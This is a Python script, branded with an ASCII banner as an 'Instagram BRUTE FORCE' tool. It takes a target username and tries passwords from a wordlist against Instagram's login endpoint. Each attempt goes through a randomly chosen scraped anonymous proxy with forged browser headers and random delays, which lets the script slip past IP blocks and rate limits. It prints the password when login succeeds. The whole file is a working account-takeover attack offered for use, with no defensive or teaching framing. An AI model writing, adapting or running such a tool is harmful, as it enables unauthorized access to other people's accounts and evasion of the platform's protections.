from lxml.html import fromstring
import requests
from requests.auth import HTTPProxyAuth
import random
import time
from bs4 import BeautifulSoup as bs
import urllib3
from urllib.request import Request, urlopen
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

print("""

██╗░░░░░███╗░░░███╗  ██████╗░██████╗░██╗░░░██╗████████╗███████╗  ███████╗░█████╗░██████╗░░█████╗░███████╗
██║░░░░░████╗░████║  ██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝  ██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░░░░██╔████╔██║  ██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░  █████╗░░██║░░██║██████╔╝██║░░╚═╝█████╗░░
██║░░░░░██║╚██╔╝██║  ██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░  ██╔══╝░░██║░░██║██╔══██╗██║░░██╗██╔══╝░░
███████╗██║░╚═╝░██║  ██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗  ██║░░░░░╚█████╔╝██║░░██║╚█████╔╝███████╗
╚══════╝╚═╝░░░░░╚═╝  ╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝  ╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░╚════╝░╚══════╝

                      Developers : MOOMLE !!
                      HTTPS://TEXT.LMLOL.XYZ 
                      Instagram BRUTE FORCE!

        [+]███████████████████████████████████████████████████████████████████████████████████[+]

""")


def login():
    count = 0
    username = input("[+] Username : ")
    
    
    while True:
        ua = UserAgent()
        proxies = [] # Will contain proxies [ip, port]
        proxies_req = Request('https://free-proxy-list.net/anonymous-proxy.html')
        proxies_req.add_header('User-Agent', ua.random)
        proxies_doc = urlopen(proxies_req).read().decode('utf8')
        soup = BeautifulSoup(proxies_doc, 'html.parser')
        proxies_table = soup.find(id='proxylisttable')
        # find_all proxies in the array
        for row in proxies_table.tbody.find_all('tr'):
            proxies.append({
            'ip':   row.find_all('td')[0].string,
            'port': row.find_all('td')[1].string
            })

        # Choose a random proxy
        proxy_index = random.randint(0, len(proxies) - 1)
        proxy = proxies[proxy_index]
        PROXY = proxy['ip'] + ':' + proxy['port']
        
        proxieso = {'http': 'http://'+PROXY, 'https': 'http://'+PROXY}
        #proxy end 
        lines1 = [line for line in open ("passw.txt")]

        count += 1
        password = lines1[count].strip()
        
        timeslleep = random.randint(2, 4)
        
        headers = {
            'authority': 'www.instagram.com',
            'method': 'POST',
            'path': '/accounts/login/ajax/',
            'scheme': 'https',
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '322',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'missing',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/',
            'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
            'sec-ch-ua-mobile': '?0',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
            'x-asbd-id': '437806',
            'x-csrftoken': 'j2TnjtUrcxtqqDqO888Crg5ceMqFnjok',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-instagram-ajax': '8efffa255ae6-hot',
            'x-requested-with': 'XMLHttpRequest'
        }

        data = {
            'username': username,
            'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:' + password
        }
        print()
        print("[+] PROXY : "+PROXY)

        try:
            
            request = requests.post('https://www.instagram.com/accounts/login/ajax/', headers=headers ,data=data,proxies=proxieso).text
            
            print("[+] Username : "+username)
            print("[+] chack password : " + password)

            if ('"authenticated":true')in request:
                print("""
                
█▄█ █▀▀ █▀   █░█ █▀▀   █ █▀   █▀▀ █ █▄░█ █▀▄   ▀█▀ █░█ █▀▀   █▀█ ▄▀█ █▀ █▀ █░█░█ █▀█ █▀█ █▀▄
░█░ ██▄ ▄█   █▀█ ██▄   █ ▄█   █▀░ █ █░▀█ █▄▀   ░█░ █▀█ ██▄   █▀▀ █▀█ ▄█ ▄█ ▀▄▀▄▀ █▄█ █▀▄ █▄▀
                """)
                print("[+] password : " + password)
                break
            
            if ('"message":"Please wait a few minutes before you try again."') in request:
                print("maby is find the password")

            if ('"authenticated":false') in request:
                print("[+] Bad password : "+password) 

            if ('"error_type":"ip_block"') in request:
                print("[+] IP Block : "+PROXY)

            if('"spam":true') in request:
                print("[+] spam ip: "+PROXY) 

            if ('"status":"fail"') in request:
                print("[+] time out : " + PROXY)
                print("[+] maby you have ban : ")
                
            if ('"message":"Please wait a few minutes before you try again."') in request:
                print("[+] Please wait a few minutes before you try again.")
            print()    
        except:
            print("[+] Error 400 : ")
login()    
